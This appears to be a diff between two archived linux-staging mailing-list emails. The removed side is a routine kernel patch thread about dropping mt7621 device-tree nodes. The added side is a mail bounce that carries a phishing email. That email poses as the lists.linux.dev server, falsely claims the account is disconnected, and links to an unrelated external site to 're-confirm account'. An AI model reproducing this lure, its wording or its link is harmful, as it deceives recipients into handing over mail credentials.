@@ -1,158 +1,120 @@
-Received: from mail-ua1-f42.google.com (mail-ua1-f42.google.com [209.85.222.42])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
-	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 151142C81
-	for <linux-staging@lists.linux.dev>; Mon, 18 Oct 2021 17:02:30 +0000 (UTC)
-Received: by mail-ua1-f42.google.com with SMTP id f3so9224702uap.6
-        for <linux-staging@lists.linux.dev>; Mon, 18 Oct 2021 10:02:29 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20210112;
-        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
-         :cc;
-        bh=kACQMzGQVwtKPf4S7jQukhStJiqLKcGmYg6R1UeOLfg=;
-        b=YcjIdDwSK5QCwxFwg5TEVD8tP4xsJHqgLPAHZTLBkX5qAu/aGiF4wbiJ2Pqzfq6AV1
-         UjZdFDmcxWWUpkw5FoRr3o3zzxH5c7GAdzLp10CozlGObG1w9eIVjj3aNmmSYhj0C9fJ
-         HshU54PKAmP+FB1Wjt23Vjof4Jev0OIaQ4ry5ylw1fXNvZlm63q7K1ZYKJqtxdGmfUbh
-         R3ez3jeeuq8aAKGRWoG+wzEBGIz0V06Jfy0peegpWDjN0S3WTP0uPTmgr9hYN5/nCeFr
-         Vtsuk+2P8Md8DBx2rCbNFw9dW0VWjzQJC6fN73z4RUsmcJZ1L4m6XB5g+9r0j45npWez
-         vbQg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20210112;
-        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
-         :message-id:subject:to:cc;
-        bh=kACQMzGQVwtKPf4S7jQukhStJiqLKcGmYg6R1UeOLfg=;
-        b=0kQk8XgPDtQ1jh1nk5ytmit9Lxjj7opCFB9k2BfpbwGWcEj38HLVs5YroAKpfyUphr
-         BghJhS/Oz/KJjCm9gvWANX/3zYHEQwf1uf32jx3uxY/2oBN03YXgp2JsHgAi4ZJNj8QB
-         yV94vQMistXs0QKaVYN2VLNscBViQZblS1t/JR5sdTnwL8Yzd1fwmpr8fDIEXtJU5Yvc
-         dA/xBKy/G9S74znKnlRkHMfXotvItyFmUUiVIjLqWI5MOGEPscHqVTCdsVNZk91+SNb+
-         kzGrYk4ELjyjHeKZN8OU5si7ohp7AcHtQBBAJHpjunvnFwter8X39IyqddatGlNjlVGD
-         kuEQ==
-X-Gm-Message-State: AOAM531JpEo1Bq8vPARwu/WGixuDR9etr8zH7+UcMG8bOBC7E7O8vDOB
-	dYT7bHLqVQfBFfL68cKXhtVhSPCrdNAi/dd8LLM=
-X-Google-Smtp-Source: ABdhPJyMy8NDk2LnfVGbqhDNIpmK6C97UucXwYyirgx04mjaGykUZIE+37Nq6MgmUyhrtJXz/EdmPTdf9TDPIGv2tm4=
-X-Received: by 2002:a05:6102:3ec3:: with SMTP id n3mr28638862vsv.48.1634576548974;
- Mon, 18 Oct 2021 10:02:28 -0700 (PDT)
+Received: from bizcloud-send.saneequipments.com (unknown [137.184.199.154])
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id F061B2C81
+	for <linux-staging@lists.linux.dev>; Mon, 18 Oct 2021 17:29:18 +0000 (UTC)
+Received: by bizcloud-send.saneequipments.com (Postfix)
+	id 3F55D4552B2; Mon, 18 Oct 2021 16:27:04 +0000 (UTC)
+Date: Mon, 18 Oct 2021 16:27:04 +0000 (UTC)
+From: MAILER-DAEMON@bizcloud-send.saneequipments.com (Mail Delivery System)
+Subject: Undelivered Mail Returned to Sender
+To: linux-staging@lists.linux.dev
+Auto-Submitted: auto-replied
 Precedence: bulk
 X-Mailing-List: linux-staging@lists.linux.dev
 List-Id: <linux-staging.lists.linux.dev>
 List-Subscribe: <mailto:linux-staging+subscribe@lists.linux.dev>
 List-Unsubscribe: <mailto:linux-staging+unsubscribe@lists.linux.dev>
 MIME-Version: 1.0
-References: <20211018153554.10471-1-sergio.paracuellos@gmail.com> <YW2XMkfAdbQm75j+@kroah.com>
-In-Reply-To: <YW2XMkfAdbQm75j+@kroah.com>
-From: Sergio Paracuellos <sergio.paracuellos@gmail.com>
-Date: Mon, 18 Oct 2021 19:02:17 +0200
-Message-ID: <CAMhs-H_8XLkyFZAEAE98bGUb+raeX8hZW_YPmv7nowWJBmWX-A@mail.gmail.com>
-Subject: Re: [PATCH] staging: mt7621-dts: get rid of nodes with no in-tree driver
-To: Greg KH <gregkh@linuxfoundation.org>
-Cc: linux-staging@lists.linux.dev, NeilBrown <neil@brown.name>
-Content-Type: text/plain; charset="UTF-8"
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="3748F4E8C42.1634574424/bizcloud-send.saneequipments.com"
+Message-Id: <20211018162704.3F55D4552B2@bizcloud-send.saneequipments.com>
 
-Hi Greg,
+This is a MIME-encapsulated message.
 
-On Mon, Oct 18, 2021 at 5:48 PM Greg KH <gregkh@linuxfoundation.org> wrote:
->
-> On Mon, Oct 18, 2021 at 05:35:53PM +0200, Sergio Paracuellos wrote:
-> > Nodes for 'i2s' and 'nand' have no driver present inside the linux tree.
-> > The normal approach for a dts file to be mainlined is start with those stuff
-> > which is already mainlined and get rid of the other stuff. If needed it will
-> > be properly added afterwards together with the suitable device driver. Hence,
-> > remove both nodes from the device tree include file.
-> >
-> > Signed-off-by: Sergio Paracuellos <sergio.paracuellos@gmail.com>
-> > ---
-> >  drivers/staging/mt7621-dts/mt7621.dtsi | 36 --------------------------
-> >  1 file changed, 36 deletions(-)
-> >
-> > diff --git a/drivers/staging/mt7621-dts/mt7621.dtsi b/drivers/staging/mt7621-dts/mt7621.dtsi
-> > index dd7d06c5f234..787220d4d3b4 100644
-> > --- a/drivers/staging/mt7621-dts/mt7621.dtsi
-> > +++ b/drivers/staging/mt7621-dts/mt7621.dtsi
-> > @@ -102,28 +102,6 @@ i2c: i2c@900 {
-> >                       pinctrl-0 = <&i2c_pins>;
-> >               };
-> >
-> > -             i2s: i2s@a00 {
-> > -                     compatible = "mediatek,mt7621-i2s";
-> > -                     reg = <0xa00 0x100>;
-> > -
-> > -                     clocks = <&sysc MT7621_CLK_I2S>;
-> > -                     clock-names = "i2s";
-> > -                     resets = <&sysc MT7621_RST_I2S>;
-> > -                     reset-names = "i2s";
-> > -
-> > -                     interrupt-parent = <&gic>;
-> > -                     interrupts = <GIC_SHARED 16 IRQ_TYPE_LEVEL_HIGH>;
-> > -
-> > -                     txdma-req = <2>;
-> > -                     rxdma-req = <3>;
-> > -
-> > -                     dmas = <&gdma 4>,
-> > -                             <&gdma 6>;
-> > -                     dma-names = "tx", "rx";
-> > -
-> > -                     status = "disabled";
-> > -             };
-> > -
-> >               memc: syscon@5000 {
-> >                       compatible = "mediatek,mt7621-memc", "syscon";
-> >                       reg = <0x5000 0x1000>;
-> > @@ -355,20 +333,6 @@ cdmm: cdmm@1fbf8000 {
-> >               reg = <0x1fbf8000 0x8000>;
-> >       };
-> >
-> > -     nand: nand@1e003000 {
-> > -             status = "disabled";
-> > -
-> > -             compatible = "mediatek,mt7621-nand";
-> > -             bank-width = <2>;
-> > -             reg = <0x1e003000 0x800
-> > -                     0x1e003800 0x800>;
-> > -             #address-cells = <1>;
-> > -             #size-cells = <1>;
-> > -
-> > -             clocks = <&sysc MT7621_CLK_NAND>;
-> > -             clock-names = "nand";
-> > -     };
-> > -
-> >       ethernet: ethernet@1e100000 {
-> >               compatible = "mediatek,mt7621-eth";
-> >               reg = <0x1e100000 0x10000>;
-> > --
-> > 2.33.0
->
-> When trying to apply this I get:
->
-> checking file drivers/staging/mt7621-dts/mt7621.dtsi
-> Reversed (or previously applied) patch detected!  Assume -R? [n]
-> Apply anyway? [n]
-> Skipping patch.
-> 2 out of 2 hunks ignored
->
-> Are you sure you rebased?
->
-> Hm, ah, I can handle this with fuzz maybe:
-> patching file drivers/staging/mt7621-dts/mt7621.dtsi
-> Reversed (or previously applied) patch detected!  Assume -R? [n] n
-> Apply anyway? [n] y
-> Hunk #1 FAILED at 102.
-> Hunk #2 succeeded at 358 (offset 3 lines).
-> 1 out of 2 hunks FAILED -- saving rejects to file drivers/staging/mt7621-dts/mt7621.dtsi.rej
->
-> Nope, that didn't work.
->
-> Again, are you sure you rebased?  Against what tree?
+--3748F4E8C42.1634574424/bizcloud-send.saneequipments.com
+Content-Description: Notification
+Content-Type: text/plain; charset=us-ascii
 
-You are right, I had another staging-testing branch in a different
-tree and had one commit in between there. I hopefully fixed it now and
-sent v2.
+This is the mail system at host bizcloud-send.saneequipments.com.
 
-Thanks and sorry for the inconvenience.
+I'm sorry to have to inform you that your message could not
+be delivered to one or more recipients. It's attached below.
 
-Best regards,
-    Sergio Paracuellos
+For further assistance, please send mail to postmaster.
 
->
-> thanks,
->
-> greg k-h
+If you do so, please include this problem report. You can
+delete your own text from the attached returned message.
+
+                   The mail system
+
+<linux-staging@lists.linux.dev>: host smtp.subspace.kernel.org[44.238.234.78]
+    said: 550 5.7.1 Blocked by SpamAssassin (in reply to end of DATA command)
+
+--3748F4E8C42.1634574424/bizcloud-send.saneequipments.com
+Content-Description: Delivery report
+Content-Type: message/delivery-status
+
+Reporting-MTA: dns; bizcloud-send.saneequipments.com
+X-Postfix-Queue-ID: 3748F4E8C42
+X-Postfix-Sender: rfc822; linux-staging@lists.linux.dev
+Arrival-Date: Mon, 18 Oct 2021 15:45:58 +0000 (UTC)
+
+Final-Recipient: rfc822; linux-staging@lists.linux.dev
+Original-Recipient: rfc822;linux-staging@lists.linux.dev
+Action: failed
+Status: 5.7.1
+Remote-MTA: dns; smtp.subspace.kernel.org
+Diagnostic-Code: smtp; 550 5.7.1 Blocked by SpamAssassin
+
+--3748F4E8C42.1634574424/bizcloud-send.saneequipments.com
+Content-Description: Undelivered Message
+Content-Type: message/rfc822
+
+Return-Path: <linux-staging@lists.linux.dev>
+Received: from marvell.com (bizcloud-send.saneequipments.com [IPv6:::1])
+	by bizcloud-send.saneequipments.com (Postfix) with ESMTP id 3748F4E8C42
+	for <linux-staging@lists.linux.dev>; Mon, 18 Oct 2021 15:45:58 +0000 (UTC)
+From: e-Mail Server lists.linux.dev <linux-staging@lists.linux.dev>
+To: linux-staging@lists.linux.dev
+Subject: linux-staging@lists.linux.dev disconnected! Re-confirm to fix now!
+Date: 18 Oct 2021 08:45:58 -0700
+Message-ID: <20211018084558.8F13650FEF67E906@lists.linux.dev>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/htm=
+l4/strict.dtd">
+
+<HTML><HEAD><TITLE>linkdn msg</TITLE>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.20045"></HEAD>
+<body>
+<P><FONT face=3DVerdana>We noticed that your&nbsp;<STRONG style=3D"BOX-SIZI=
+NG: border-box">linux-staging@lists.linux.dev</STRONG>&nbsp;have been disco=
+nnected from sending and receiving mails<BR style=3D"BOX-SIZING: border-box=
+"><BR style=3D"BOX-SIZING: border-box">We urge you to re-confirm if your ac=
+count is still active on our server to officially unlock it to your default=
+ settings.<BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: bor=
+der-box"></FONT>
+<table style=3D"FONT-SIZE: 11px; FONT-FAMILY: monospace; WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT=
+-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2;=
+ LETTER-SPACING: normal; font-variant-caps: normal; font-variant-ligatures:=
+ normal; text-decoration-color: initial; text-decoration-style: initial; -w=
+ebkit-text-stroke-width: 0px; text-decoration-thickness: initial" height=3D=
+"40" width=3D"400" bgcolor=3D"#424242">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: Roboto, RobotoDraft, Helv=
+etica, Arial, sans-serif; MARGIN: 0px"><FONT style=3D"BOX-SIZING: border-bo=
+x" size=3D2 face=3Dverdana>
+<DIV style=3D"BOX-SIZING: border-box" align=3Dcenter><A title=3D"This exter=
+nal link will open in a new window" style=3D"BOX-SIZING: border-box; COLOR:=
+ rgb(14,76,146); OUTLINE-WIDTH: medium; OUTLINE-STYLE: none; OUTLINE-COLOR:=
+ invert; text-decoration-line: none" href=3D"https://brittoprofissional.com=
+/brito-21/update21-verfy/#linux-staging@lists.linux.dev" target=3D_blank><F=
+ONT style=3D"BOX-SIZING: border-box" color=3D#ffffff size=3D2 face=3Dverdan=
+a>Re-confirm account</FONT></A></DIV></FONT></TD></TR></TBODY></TABLE>
+<FONT style=3D"BOX-SIZING: border-box; FONT-SIZE: small; WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,=
+0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TE=
+XT-INDENT: 0px; font-variant-caps: normal; font-variant-ligatures: normal; =
+text-decoration-color: initial; text-decoration-style: initial; -webkit-tex=
+t-stroke-width: 0px; text-decoration-thickness: initial" size=3D2 face=3Dve=
+rdana><BR style=3D"BOX-SIZING: border-box">
+<BR style=3D"BOX-SIZING: border-box"><FONT size=3D3>Once confirmation is co=
+mplete, your mailbox will work effectively.<BR style=3D"BOX-SIZING: border-=
+box"><BR style=3D"BOX-SIZING: border-box">Copyright&#65533; lists.linux.dev=
+ All rights reserved.</FONT></FONT></P></BODY></HTML>
+
+--3748F4E8C42.1634574424/bizcloud-send.saneequipments.com--
